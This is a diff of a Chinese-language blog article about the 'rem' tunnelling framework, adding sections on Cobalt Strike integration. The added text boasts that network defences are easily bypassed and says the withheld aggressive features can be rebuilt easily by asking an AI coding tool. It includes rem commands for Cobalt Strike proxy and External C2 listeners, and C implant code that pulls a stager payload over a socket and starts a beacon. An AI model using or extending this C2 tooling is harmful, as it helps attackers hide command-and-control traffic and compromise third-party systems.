@@ -1,8 +1,12 @@
 ## 前言
 
-在上一部分中，我们介绍了rem的设计与实现。 而当我们完成了基础的构建，现在可以做得更多。
+在上一部分中，我们介绍了rem的设计与实现。 而当我们完成了基础的构建，现在可以做得更多！
 
-我将结合各种场景， 进一步探索rem在各个场景中的玩法。 **建议结合代码阅读**
+网络侧的对抗强度远远不如端上对抗激烈， 只需要很简单的方法就能绕过所有的设备。 rem提供了这样的潜力。
+
+> 为了规避潜在的风险，rem-community中没有特别激进的技术，大多只提供了设计思路。 但在理解原理后， 将需求告诉cursor， 可以非常轻易的实现本文提到的所有内容。
+
+本文将结合各种实战场景， 进一步探索rem在各个场景中的玩法。 **本文的内容涉及大量专业知识和代码，建议结合代码阅读**
 
 ## 传输层
 
@@ -273,9 +277,83 @@ tls是某个不可言说的领域中玩法最多的存在。 常见的玩法包�
 
 ## CobaltStrike联动
 
-### External
-
 ### Proxy
+
+cobaltstrike的listener配置中提供了http-proxy, 可以通过rem搭建一个http_proxy, 即可将流量转发到外网。 
+
+```
+rem -c [rem_link] -m proxy -l http://:8080
+```
+
+然后在CS中配置listener即可
+
+![](assets/Pasted%20image%2020250410000730.png)
+### External C2
+
+还有更高级的玩法. CS在早几年前就实现了一个简易的第三方信道上线的功能 externalc2.
+
+官方文档见: https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructure_external-c2.htm
+
+简单来说， 分为两个部分， implant (需自行实现)和 channel (基于rem实现)。 implant需要实现shellcode注入和pipe交互两个功能. channel负责转发流量到external listener。 
+
+原理很简单， implant初始化后从CS的server获取stager shellcode， 执行对应shellcode， 这个stager基于SMB(pipe)通讯，implant负责将转发 pipe与channel之间的数据。
+
+在CS中新增external C2 listener
+
+![](assets/Pasted%20image%2020250410000957.png)
+
+然后rem构建对应协议的应用层为CS， 可以任意选择传输层
+```
+./rem -c [rem_link] -m proxy -l cs://:12345 -r raw://
+```
+
+implant需要自行实现，我让ai生成了一段简单的代码
+
+```C
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
+        printf("WSAStartup failed: %d\n", WSAGetLastError());
+        return;
+    }
+
+    /* 创建 socket */
+    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (sock == INVALID_SOCKET) {
+        printf("socket failed: %d\n", WSAGetLastError());
+        WSACleanup();
+        return;
+    }
+    /* 配置服务器地址 */
+
+    struct sockaddr_in server;
+    server.sin_family = AF_INET;
+    server.sin_port = htons(26019); // 指定端口，例如 12345
+    server.sin_addr.s_addr = inet_addr("127.0.0.1"); // 指定 IP，例如本地 127.0.0.1
+    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
+        printf("connect failed: %d\n", WSAGetLastError());
+        closesocket(sock);
+        WSACleanup();
+        return;
+    }
+    
+    /* 从 socket 获取 payload */
+    char *srvpayload = malloc(PAYLOAD_MAX_SIZE);
+    if (!srvpayload) {
+        printf("malloc failed\n");
+        closesocket(sock);
+        WSACleanup();
+        return;
+    }
+    int srvpayloadLen = read_frame_sock(sock, srvpayload, PAYLOAD_MAX_SIZE);;
+
+    /* 启动 Beacon */
+    HANDLE handle_beacon = start_beacon(srvpayload, srvpayloadLen);
+```
+
+![](assets/Pasted%20image%2020250409235950.png)
+
+这样就可以复用刚才提过的rem实现的各种隐蔽的流量侧特性与多协议传输层。 大大拓展了原本CS只支持DNS、HTTP、TCP的三种传输层。
+
 
 ## 嵌入到rust implant中
 
@@ -506,3 +584,10 @@ malefic-mutant generate beacon
 cargo build --release -p malefic
 ```
 
+## 结语
+
+rem实际上已经重构了4次，不断的拓展能力的边界， 已经不是一个单纯的代理工具，而是开发框架。 
+
+在发布时， 我考虑了很长时间如何去掉一些具有过强攻击性的能力又不影响其架构。目前发布的版本包含了所有的基本功能，但在一些特殊的模块上没有对外暴露或者需要手动配置又或者需要简单二开(cursor就可以完美胜任)。 
+
+网络侧的攻防也不仅限于本文提到的内容， 实际上还有更多的玩法和思路。
